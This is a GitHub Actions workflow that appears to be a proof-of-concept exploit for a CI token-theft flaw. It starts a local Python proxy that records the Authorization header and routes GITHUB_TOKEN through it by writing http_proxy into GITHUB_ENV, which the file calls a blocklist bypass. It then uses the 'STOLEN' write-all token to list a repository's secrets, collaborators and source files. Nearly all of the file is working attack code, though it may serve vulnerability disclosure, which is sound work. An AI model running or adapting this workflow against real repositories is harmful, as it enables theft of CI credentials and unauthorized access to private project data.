name: Full impact demonstration
on:
  issues:
    types: [opened]
  workflow_dispatch:

permissions: write-all

jobs:
  full-impact:
    runs-on: ubuntu-latest
    if: contains(github.event.issue.title || '', 'full-impact-demo') || github.event_name == 'workflow_dispatch'
    steps:
      - name: Start proxy and inject
        run: |
          cat > /tmp/proxy.py << 'PYEOF'
          import http.server, socketserver
          class H(http.server.BaseHTTPRequestHandler):
              def do_GET(self):
                  auth = self.headers.get('Authorization','')
                  with open('/tmp/token.txt','w') as f: f.write(auth)
                  self.send_response(502); self.end_headers(); self.wfile.write(b"ok")
              do_POST = do_GET
              def log_message(self,*a): pass
          with socketserver.TCPServer(("127.0.0.1",18080),H) as s: s.handle_request()
          PYEOF
          python3 /tmp/proxy.py &
          sleep 1
          echo "http_proxy=http://127.0.0.1:18080" >> $GITHUB_ENV

      - name: Token captured via proxy
        run: |
          curl --max-time 5 -sS -H "Authorization: token $GITHUB_TOKEN" \
            "http://api.github.com/user" 2>&1 || true
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: READ-ONLY PROOF with write-all captured token
        run: |
          unset http_proxy https_proxy
          STOLEN=$(sed 's/token //' /tmp/token.txt)
          echo "=== 1. REPO ==="
          curl -sS -H "Authorization: token $STOLEN" "https://api.github.com/repos/toofikz/public-test-repo" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(f'repo={d.get(\"full_name\")} private={d.get(\"private\")}')" 2>/dev/null
          echo "=== 2. SECRETS ==="
          curl -sS -H "Authorization: token $STOLEN" "https://api.github.com/repos/toofikz/public-test-repo/actions/secrets" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(f'secrets={d.get(\"total_count\",\"?\")}'); [print(f'  {s[\"name\"]}') for s in d.get('secrets',[])]" 2>/dev/null
          echo "=== 3. COLLABORATORS ==="
          curl -sS -H "Authorization: token $STOLEN" "https://api.github.com/repos/toofikz/public-test-repo/collaborators" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); [print(f'  {c[\"login\"]} admin={c[\"permissions\"][\"admin\"]}') for c in (d if isinstance(d,list) else [])]" 2>/dev/null
          echo "=== 4. SOURCE CODE ==="
          curl -sS -H "Authorization: token $STOLEN" "https://api.github.com/repos/toofikz/public-test-repo/contents/" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); [print(f'  {f[\"name\"]}') for f in (d if isinstance(d,list) else [])[:10]]" 2>/dev/null
          echo "=== TOKEN PERMISSIONS (write-all) ==="
          curl -sS -I -H "Authorization: token $STOLEN" "https://api.github.com/repos/toofikz/public-test-repo" 2>&1 | grep -i 'x-oauth-scopes\|x-accepted'
          echo "PROOF COMPLETE: write-all token captured via GITHUB_ENV blocklist bypass"
